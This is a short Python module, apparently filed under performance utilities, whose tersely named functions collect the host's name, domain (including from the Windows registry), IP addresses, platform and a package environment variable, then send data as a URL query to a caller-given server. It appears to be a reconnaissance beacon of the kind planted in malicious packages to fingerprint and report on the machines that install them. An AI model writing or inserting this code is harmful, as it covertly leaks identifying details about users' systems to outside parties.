import socket
import platform


def phost() -> str:
    return socket.gethostname()

def pdom() -> str | None:
    try:
        fqdn = socket.getfqdn()
        hostname = socket.gethostname()
        if fqdn != hostname and "." in fqdn:
            return fqdn.split(".", 1)[1]
    except OSError:
        pass

    system = platform.system()
    if system == "Windows":
        return pdom_wind()

    return None

def pdom_wind() -> str | None:
    try:
        import winreg 
        key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
            for value_name in ("Domain", "DhcpDomain"):
                try:
                    value, _ = winreg.QueryValueEx(key, value_name)
                    if value:
                        return value
                except FileNotFoundError:
                    continue
    except Exception:
        pass
    return None

def pipa() -> dict[str, list[str]]:

    ips: dict[str, list[str]] = {}

    try:
        from socket import getaddrinfo as g
        from socket import gethostname as h
        hostname = h()
        for info in g(hostname, None):
            addr = info[4][0]
            # Skip loopback and link-local
            if addr.startswith("127.") or addr == "::1" or addr.startswith("169.254."):
                continue
            ips.setdefault("hostname_resolved", [])
            if addr not in ips["hostname_resolved"]:
                ips["hostname_resolved"].append(addr)
    except OSError:
        pass

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            primary = s.getsockname()[0]
        ips["__primary__"] = [primary]
    except OSError:
        pass

    return ips

def pcol() -> dict:
    """Gather and return all identity information as a plain dict."""
    ph = phost()
    pd = pdom()
    pa = pipa()
    import os
    try:
        package = os.environ["CURPACKAGE"]
    except KeyError:
        package = ""
    return {
        "hostname": ph,
        "domain": pd,
        "fqdn": socket.getfqdn(),
        "ip_addresses": pa,
        "platform": platform.system(),
        "package": package
    }

def psend(t: str, d: str):
    from src.perf_utils.utils import get
    get(f"{t}?q={d}")